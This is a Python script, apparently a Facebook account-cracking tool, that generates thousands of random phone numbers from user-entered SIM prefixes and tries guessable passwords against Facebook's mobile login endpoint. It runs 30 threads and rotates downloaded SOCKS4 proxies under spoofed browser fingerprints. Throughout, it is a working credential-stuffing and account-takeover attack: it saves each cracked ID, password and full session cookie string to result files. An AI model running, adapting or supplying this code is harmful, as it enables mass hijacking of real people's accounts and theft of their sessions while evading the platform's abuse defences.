P, M, K, B, H, J, A, O = '\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[38;5;208m','\x1b[1;90m','\x1b[0;33m'

import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
from concurrent.futures import ThreadPoolExecutor as Ngangkang
from datetime import datetime

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proksi.txt','w').write(prox)
except Exception as e:
	print(e)

id,memek,loop,ok,cp=[],[],0,0,0

bln = ["januari","februari","maret","april","mei","juni","juli","agustus","september","oktober","november","desember"]
now = datetime.now()
tanggal = now.day
blx = now.month

try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()

bulan = bln[xx]
tahun = now.year
simpan = str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010/2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011/2012'
		elif fx[:6] in ['100004']          :tahunz = '2012/2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013/2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014/2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015/2016'
		elif fx[:5] in ['10002']           :tahunz = '2016/2017'
		elif fx[:5] in ['10003']           :tahunz = '2018/2019'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021/2022'
		else:tahunz='2023'
	elif len(fx) in [9,10]:
		tahunz = '2008/2009'
	elif len(fx)==8:
		tahunz = '2007/2008'
	elif len(fx)==7:
		tahunz = '2006/2007'
	else:tahunz='2023/2024'
	return tahunz

user=[]
def Mulai():
	wkt = datetime.now()
	kode = input(f'{P}● example : +88017,+88018,+88019,+88014,+88013\n● enter sim code : ')
	kodex = ''.join(random.choice(string.digits) for _ in range(2))
	kod = ''.join(random.choice(string.digits) for _ in range(2))
	limit = str(random.randint(3000,7000))
	for nmbr in range(int(limit)):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with Ngangkang(max_workers=30) as Kanjut:
		print(f'\n{P}● results {H}ok {P}saved in {H}ok{P}/{H}ok-{simpan}\n{P}● results {K}cp {P}saved in {K}cp{P}/{K}cp-{simpan}\n')
		tl = str(len(user))
		for guru in user:
			uid = kode+kodex+kod+guru
			pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'jakaria','faizan']
			Kanjut.submit(asy,uid,pwx,tl,wkt)
			
try:
	get_ua = open('ugent.txt','r').readlines()
	user_gent = random.choice(get_ua).replace('\n','')
	sdk_ver = re.search('Android (.*?)\)',str(user_gent)).group(1).split(';')[0]
	chr_ver = re.search(' Chrome/(.*?) Mobile Safari',str(user_gent)).group(1).split(' ')[0]
	set_ua = f'{user_gent}|"Not:A-Brand";v="99", "Chromium";v="'+chr_ver.split('.')[0]+f'"|{sdk_ver}|{chr_ver}'
except Exception as e:
	set_ua = f'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
	
def asy(uid,pwx,tl,wkt):
	global loop,ok,cp
	waktu = str(datetime.now()-wkt).split('.')[0]
	print(f"{P}  [{O}{waktu}{P}]—[{loop}{A}│{P}{len(user)}]—[{H}{ok}{A}│{K}{cp}{P}]", end="\r")
	ewe = requests.Session()
	ua = set_ua.split('|')[0];ch_ua = set_ua.split('|')[1];sdk_ver = set_ua.split('|')[2];chr_ver = set_ua.split('|')[3]
	for pw in pwx:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {
					'http': 'socks4://'+random.choice(xx)
					}
			link = ewe.get("https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
				"try_number": 0,
				"unrecognized_tries": 0,
				"email": uid,
				"prefill_contact_point": uid,
				"prefill_source": "browser_dropdown",
				"prefill_type": "contact_point",
				"first_prefill_source": "browser_dropdown",
				"first_prefill_type": "contact_point",
				"had_cp_prefilled": True,
				"had_password_prefilled": False,
				"is_smart_lock": False,
				"bi_xrwh": 0,
				"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
				"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
				}
			headers = {
				"Host": "p.facebook.com",
				"content-length": str(len((data))),
				"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
				"sec-ch-ua-mobile": "?1",
				"user-agent": ua,
				"x-response-format": "JSONStream",
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
				"viewport-width": "360",
				"x-requested-with": "XMLHttpRequest",
				"x-asbd-id": "129477",
				"dpr": "2",
				"sec-ch-prefers-color-scheme": "light",
				"sec-ch-ua-platform": '"Android"',
				"accept": "*/*",
				"origin": "https://p.facebook.com",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			response = ewe.post("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,
				headers = headers,
				allow_redirects = False,
				proxies = zz
				)
			if "checkpoint" in ewe.cookies.get_dict():
				ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f"\r{M}[{P}│{M}] {K}{ids}{P}│{K}{pw} {P}──≻ {J}{tahun(ids)}\n{P} └─ {K}{ua}\n")
				cp+=1
				open('cp/cp-'+simpan,'a').write(ids+'|'+pw+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				ids = re.findall('c_user=(.*);xs', kuki)[0]
				print(f"\r{B}[{P}│{B}] {H}{ids}{P}│{H}{pw} {P}──≻ {J}{tahun(ids)}\n{P} └─ {H}{kuki}\n")
				ok+=1
				open('ok/ok-'+simpan,'a').write(ids+'|'+pw+'|'+kuki+'\n')
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
 
if __name__=='__main__':
	try:os.mkdir('ok')
	except:pass
	try:os.mkdir('cp')
	except:pass
	os.system('clear')
	Mulai()